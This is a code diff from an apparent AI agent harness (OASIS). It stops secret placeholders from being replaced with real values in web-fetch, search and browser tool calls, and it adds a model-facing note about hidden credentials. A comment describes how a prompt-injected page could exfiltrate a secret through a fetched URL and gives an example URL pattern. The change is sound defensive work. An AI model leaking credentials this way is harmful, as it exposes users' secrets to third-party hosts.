@@ -100,6 +100,17 @@ export function unmaskSecrets(session, value) {
   return visit(value);
 }
 
+// Tools whose arguments go straight to a third-party host. A real secret has no
+// business in a fetched URL or a search query, and swapping it in there would
+// let a prompt-injected page exfiltrate it (fetch https://site/?k=«secret:ID»)
+// from a host the user already approved, with no further prompt.
+const NO_UNMASK_TOOLS = new Set(['fetch_url', 'web_search', 'browser']);
+
+/** unmaskSecrets() for one tool call; network-read tools keep the placeholders. */
+export function unmaskSecretsForTool(session, toolName, value) {
+  return NO_UNMASK_TOOLS.has(String(toolName || '')) ? value : unmaskSecrets(session, value);
+}
+
 export const SECRET_SHIELD_NOTE = 'Values shown as «secret:ID» are credentials hidden from you by OASIS. Use the placeholder verbatim in tool arguments ' +
   '(edits, commands) and OASIS substitutes the real value; never ask the user to paste secrets and never try to reveal them.';
 
